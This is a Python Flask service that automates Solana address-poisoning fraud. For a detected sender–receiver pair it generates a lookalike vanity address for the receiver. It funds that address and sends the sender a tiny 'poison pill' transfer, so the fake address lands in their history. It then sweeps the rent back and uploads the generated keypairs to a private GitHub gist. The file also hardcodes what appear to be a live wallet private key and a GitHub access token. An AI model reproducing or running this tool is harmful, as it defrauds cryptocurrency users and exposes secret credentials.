import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "vanitygenerator")))
from soltransfer.sol_xfr import send_sol
import time
from vanitygenerator.generatekeys import generate_similar_address
import base58
import json
import logging
import threading
from solana.rpc.api import Client
from solders.pubkey import Pubkey
import requests
from datetime import datetime

# Flask imports
from flask import Flask, request, jsonify

funderpubkey = "RAPEWkHm8YZJ6ECeaasbJdUp7E3XsxVYvLvHqCPSbT1"
funderprivkey = "2YVpmDaVDv1tMEREMUSPVL4io6WKJ2yvKZdoaJTRF36qv7Knd8jARhN9Qs3o65nUbJHLRzwdXaR37GqMVjpxjDZ5"
rpc_url = "http://frankfurt.rpc.pinnaclenode.com"
initial_fund = 0.001000000
poison_pill = 0.00001
min_gas = 0.000005000
cu_prc   = 0
cu_lmt   = 250000

GITHUB_TOKEN = "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"  # Replace with your real token
GIST_PUBLIC = False
GIST_DESCRIPTION_PREFIX = 'Cyanide generated wallets'
ENABLE_GIST_UPLOAD = True

GITHUB_API_URL = "https://api.github.com/gists"
GIST_ID = "6c77da6c555c7e3255530e5e3b40b8d3"  # Put your gist ID here

gpu_lock = threading.Lock()

def get_stored_gist_id():
    """Get the stored gist ID"""
    return GIST_ID if GIST_ID else None

def get_existing_gist_content(gist_id):
    """Get existing content from gist"""
    try:
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        response = requests.get(f"{GITHUB_API_URL}/{gist_id}", headers=headers)
        if response.status_code == 200:
            gist_data = response.json()
            # Get the first file's content
            files = gist_data.get("files", {})
            if files:
                first_file = list(files.values())[0]
                return first_file.get("content", "")
        return ""
    except Exception as e:
        logging.error(f"Error getting existing gist content: {e}")
        return ""

def upload_to_gist(wallet_data, target_address):
    """
    Upload wallet data to GitHub Gist (append to existing or create new)
    """
    if not ENABLE_GIST_UPLOAD:
        print("Gist upload is disabled in configuration")
        return None
        
    if not GITHUB_TOKEN:
        logging.warning("GitHub token not configured, skipping gist upload")
        return None
    
    try:
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # Check if we have an existing gist
        gist_id = get_stored_gist_id()
        filename = "generated_wallets.jsonl"
        
        # Prepare the new wallet line
        new_wallet_line = json.dumps(wallet_data) + "\n"
        
        if gist_id:
            # Update existing gist
            existing_content = get_existing_gist_content(gist_id)
            updated_content = existing_content + new_wallet_line
            
            gist_data = {
                "files": {
                    filename: {
                        "content": updated_content
                    }
                }
            }
            
            response = requests.patch(f"{GITHUB_API_URL}/{gist_id}", json=gist_data, headers=headers)
            
            if response.status_code == 200:
                gist_url = response.json().get("html_url")
                logging.info(f"Wallet appended to existing gist: {gist_url}")
                print(f"Wallet appended to existing gist: {gist_url}")
                return gist_url
            else:
                logging.error(f"Failed to update gist: {response.status_code} - {response.text}")
                return None
        else:
            # Create new gist
            gist_data = {
                "description": f"{GIST_DESCRIPTION_PREFIX}",
                "public": GIST_PUBLIC,
                "files": {
                    filename: {
                        "content": new_wallet_line
                    }
                }
            }
            
            response = requests.post(GITHUB_API_URL, json=gist_data, headers=headers)
            
            if response.status_code == 201:
                gist_response = response.json()
                gist_url = gist_response.get("html_url")
                gist_id = gist_response.get("id")
                
                # Print the gist ID so you can copy it to GIST_ID variable
                print(f"GIST ID: {gist_id} - Copy this to GIST_ID variable for future runs!")
                
                logging.info(f"New gist created: {gist_url}")
                print(f"New gist created: {gist_url}")
                return gist_url
            else:
                logging.error(f"Failed to create gist: {response.status_code} - {response.text}")
                return None
            
    except Exception as e:
        logging.error(f"Error uploading to gist: {e}")
        return None

def safe_send_sol(*args, **kwargs):
    max_retries = 3
    delay = 2
    for attempt in range(1, max_retries + 1):
        try:
            return send_sol(*args, **kwargs)
        except Exception as e:
            logging.error(f"Attempt {attempt}: Error sending SOL: {e}")
            if attempt < max_retries:
                time.sleep(delay)
                delay *= 2
            else:
                logging.error(f"All {max_retries} attempts failed for send_sol with args: {args}, kwargs: {kwargs}")
                return None

def poison(detectedsender, detectedreceiver):
    with gpu_lock:
        similar_address = generate_similar_address(detectedreceiver)
        print(f"Generated address: {similar_address} to poison {detectedsender} who sent funds to {detectedreceiver}")
        
        # Save to local file
        with open("generated_wallets.jsonl", "a") as f:
            json.dump(similar_address, f)
            f.write("\n")
        
        # Upload to GitHub Gist immediately after generation
        gist_url = upload_to_gist(similar_address, detectedreceiver)
        if gist_url:
            print(f"Wallet data uploaded to gist: {gist_url}")
        else:
            print("Failed to upload wallet to gist (check GitHub token configuration)")
    #send sol from our funder to the similar address
    safe_send_sol(funderpubkey, funderprivkey, similar_address["public_key"], initial_fund, cu_prc, cu_lmt, rpc_url, 'Y')
    time.sleep(10)
    print(f"funded {similar_address['public_key']}")
    #send sol from the similar address to the detected sender
    safe_send_sol(similar_address["public_key"], base58.b58encode(bytes(similar_address["private_key_array"])).decode(), detectedsender, poison_pill, cu_prc, cu_lmt, rpc_url, 'Y')
    time.sleep(10)
    print(f"Poisoned {detectedsender} with {similar_address['public_key']}")
    #return the rent amount back to the funder
    safe_send_sol(similar_address["public_key"], base58.b58encode(bytes(similar_address["private_key_array"])).decode(), funderpubkey,  initial_fund-poison_pill-min_gas*2, cu_prc, cu_lmt, rpc_url, 'Y')
    time.sleep(12)
    #check if similar address has any sol balance
    LAMPORTS_PER_SOL = 1_000_000_000
    client = Client(rpc_url)
    pubkey = Pubkey.from_string(similar_address["public_key"])
    resp = client.get_balance(pubkey)
    sol_balance = resp.value / LAMPORTS_PER_SOL
    print(f"Similar address {similar_address['public_key']} has {sol_balance} SOL balance now")
    if sol_balance > min_gas:
        # send remaining balance minus min_gas back to funder
        safe_send_sol(similar_address["public_key"], base58.b58encode(bytes(similar_address["private_key_array"])).decode(), funderpubkey, sol_balance - min_gas, cu_prc, cu_lmt, rpc_url, 'Y')
        print(f"Retrying remaining balance {sol_balance - min_gas} SOL from {similar_address['public_key']} to {funderpubkey}")
    print(f"Returned rent to {funderpubkey}")

# Flask app setup
app = Flask(__name__)

@app.route('/poison', methods=['POST'])
def poison_endpoint():
    data = request.get_json()
    detectedsender = data.get('detectedsender')
    detectedreceiver = data.get('detectedreceiver')
    if not detectedsender or not detectedreceiver:
        return jsonify({'error': 'Missing parameters'}), 400
    try:
        poison(detectedsender, detectedreceiver)
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == "__main__":
    app.run(host='127.0.0.1', port=5001, threaded=True)
